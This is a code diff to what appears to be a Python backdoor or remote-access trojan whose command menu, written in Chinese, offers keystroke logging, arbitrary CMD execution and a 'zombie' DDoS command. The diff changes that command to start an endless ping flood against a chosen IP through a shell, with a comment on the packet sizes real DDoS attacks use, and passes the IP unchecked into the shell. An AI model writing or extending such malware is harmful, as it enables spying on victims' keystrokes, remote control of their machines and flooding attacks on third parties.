@@ -137,7 +137,7 @@ def handle_communication():
                             "keylog_start          - 開始鍵盤記錄\n"
                             "keylog_dump           - 顯示鍵盤記錄數據\n"
                             "<command>             - 執行CMD命令\n"
-                            "zombie <ip> <port>    - 創建DDoS殭屍\n"
+                            "zombie <ip>           - 創建DDoS殭屍\n"
                             "kill_zombie           - 停止DDoS殭屍\n"
                             "q                     - 退出")
             send_data(help_details)
@@ -194,11 +194,11 @@ def handle_communication():
         elif command[:3] == "pwd":
             send_data(os.getcwd())
         elif command[:6] == "zombie": # use ping command to create a zombie
-            ip, port = command[7:].split(" ")
+            ip = command[7:]
             try:
-                subprocess.Popen(f"ping -n 100 {ip}", shell=True)
-                zombies.append((ip, port))
-                send_data(f"[+] Zombie created at {ip}:{port}")
+                subprocess.Popen(f"ping -t -l 32 {ip}", shell=True) # In real DDos attack, packet size is usually 65,000 bytes, but for demonstration purposes, we use 32 bytes.
+                zombies.append((ip))
+                send_data(f"[+] Zombie created at {ip}")
             except:
                 send_data("[!!] Failed to create zombie!")
         elif command[:10] == "kill_zombie":
